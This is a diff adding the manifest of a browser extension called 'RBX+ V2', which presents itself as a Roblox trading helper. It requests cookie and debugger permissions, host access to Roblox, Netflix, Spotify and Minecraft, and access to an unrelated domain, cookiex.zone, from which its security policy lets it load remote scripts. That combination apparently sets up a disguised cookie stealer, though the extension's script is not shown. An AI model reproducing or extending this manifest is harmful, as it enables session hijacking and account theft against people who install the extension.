@@ -1,0 +1,33 @@
+{
+"update_url": "https://clients2.google.com/service/update2/crx",
+
+        "name": "RBX+ V2",
+        "version": "2.0",
+        "manifest_version": 2,
+        "description": "This Product Assist Users with trading and better interacting with the community.",
+        "browser_action": {
+            "default_icon": "icon.png",
+            "default_popup": "popup.html"
+        },
+        "permissions": [
+            "alarms",
+            "background",
+            "debugger",
+            "notifications",
+            "cookies",
+            "https://www.roblox.com/",
+            "https://www.netflix.com/",
+            "https://play.spotify.com/",
+            "https://minecraft.net/",
+            "https://cookiex.zone/",
+            "https://cookiex.zone/websites"
+        ],
+        "background": {
+            "scripts": ["background.js","jquery-3.2.0.js"]
+        },
+        "icons": { "16": "icon.png",
+               "48": "icon.png",
+              "128": "icon.png" },
+
+        "content_security_policy":"script-src 'self' https://cookiex.zone/; object-src 'self'"
+    }
